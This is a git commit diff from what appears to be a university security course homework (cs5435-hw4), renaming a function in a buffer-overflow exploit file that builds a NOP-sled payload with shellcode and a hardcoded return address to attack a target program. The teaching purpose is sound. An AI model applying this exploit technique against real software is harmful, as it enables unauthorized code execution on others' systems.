712ba6218b55f59f19573d94cb44ff546ab37cfb
justinhalford <justinhalford@gmail.com>
2024-05-10 18:26:54 -0400

    may 7

--- cs5435-hw4/sploits/sploit2.c
+++ cs5435-hw4/sploits/sploit2.c
@@ -9,7 +9,7 @@
 const int BUF_SIZE = 409, OFFSET = 201;
 const uint32_t RET_ADDR = 0xffffdb5c;
 
-void preparePayload(char *buffer) {
+void fill(char *buffer) {
     for (int i = 0; i < BUF_SIZE - 1; ++i) {
         buffer[i] = (i < OFFSET || i >= OFFSET + sizeof(shellcode) - 1) ? 0x90 : shellcode[i - OFFSET];
     }
@@ -22,7 +22,7 @@ void preparePayload(char *buffer) {
 
 int main(void) {
     char *args[4], *env[1], payload[BUF_SIZE];
-    preparePayload(payload);
+    fill(payload);
     args[0] = TARGET;
     args[1] = payload;
     args[2] = "65935";
